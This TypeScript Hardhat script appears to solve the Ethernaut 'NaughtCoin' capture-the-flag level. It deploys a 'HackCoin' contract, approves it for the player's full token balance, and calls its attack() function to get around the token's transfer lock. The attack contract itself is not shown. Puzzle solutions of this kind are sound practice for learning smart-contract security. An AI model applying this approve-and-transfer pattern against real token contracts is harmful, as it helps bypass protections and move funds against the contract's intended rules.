import { ethers } from "hardhat";

const INSTANCE = "0x134ef1005581161805d51d21d97c8c19d640afAf";

async function main() {
  const player = (await ethers.getSigners())[0];
  const coin = await ethers.getContractAt("NaughtCoin", INSTANCE);
  const Hack = await ethers.getContractFactory("HackCoin");
  const hack = await Hack.deploy();
  await hack.deployed();

  const balance = await coin.balanceOf(player.address);
  const approveTx = await coin.connect(player).approve(hack.address, balance);
  await approveTx.wait();
  const tx = await hack.attack(coin.address);
  await tx.wait();

  (await coin.balanceOf(player.address)).toNumber() === 0
    ? console.log("Successfully attack the contract")
    : console.log("Attack contract failed");
}

main().catch((err) => {
  console.error(err);
  process.exitCode = 1;
});
